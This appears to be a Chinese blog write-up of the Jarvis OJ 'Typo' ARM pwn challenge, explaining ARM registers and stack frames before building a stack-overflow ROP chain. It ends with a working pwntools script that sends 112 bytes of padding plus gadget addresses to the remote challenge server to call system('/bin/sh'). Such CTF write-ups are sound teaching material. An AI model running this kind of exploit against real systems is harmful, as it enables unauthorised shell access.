---
title: Jarvis OJ - Typo の Write-Up
date: 2021-01-20 17:09:22
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
- ARM
---
## Introduction

Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。

<!-- more -->

## Step 1

程序看起来是一个很有趣的打字游戏：

![](/img/Typo/Typo1.png)

checksec发现是arm架构的32位程序：

![](/img/Typo/Typo2.png)

## Step 2

再简单的温习一下ARM架构的函数调用：

![](/img/Typo/Typo3.png)

* R0～R3通常用于传参，剩下的参数从右向左依次入栈，被调用者实现栈平衡，返回值存放在R0中；

* r15  ->  pc  => 当前程序执行位置；

* r14  ->  lr  => 连接寄存器：跳转指令自动把返回地址放入r14中；

* r13  ->  sp  => 栈指针：指向上一帧的栈底；

* r12  ->  ip  => ip 内部过程调用寄存器Intra-Procedure-call scratch register，其实就是r12；

* r11  ->  fp  => 当前函数栈帧的栈底,也就是栈基地址FP；

ARM架构的栈布局如下图所示：

![](/img/Typo/Typo4.png)

main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长。图中FP就是栈基址，它指向函数的栈帧起始地址；

SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序很是规矩，依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量。先压栈的main stack 进入在高地址。

## Step 3

回到Typo程序本身，在程序中有‘/bin/sh’字符串：

![](/img/Typo/Typo5.png)

同时看到是sub_10ba8函数调用这个字符串，根据sub_10ba8函数发现这个函数其实就是system函数。在这个函数下面紧接着就是sub_110b4函数可以调用sub_10ba8即system函数。

![](/img/Typo/Typo6.png)

有了system函数和’/bin/sh’，接下来需要的是找一个gadget控制R0寄存器：

![](/img/Typo/Typo7.png)

根据找到的gadget构造这样的栈结构：

![](/img/Typo/Typo8.png)

这样在程序返回时, 经过ROP Chain就会实现`r0 -> “/bin/sh”`, `r4 -> junk_data`, `pc = system_addr`的效果, 进而执行`system("/bin/sh")`来get shell。

最后就是寻找溢出点，确定padding的长度。

![](/img/Typo/Typo9.png)

利用cyclic可以计算出padding长度112。

## Step 4

所以解题脚本如下：

```
from pwn import *

# sh = process('./typo')
sh = remote("pwn2.jarvisoj.com", 9888)

payload = 'a'*112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110b4)

sh.sendafter('quit', '\n')
sh.recvline()

sh.sendline(payload)
sh.interactive()
sh.close()
```

运行结果：

![](/img/Typo/Typo10.png)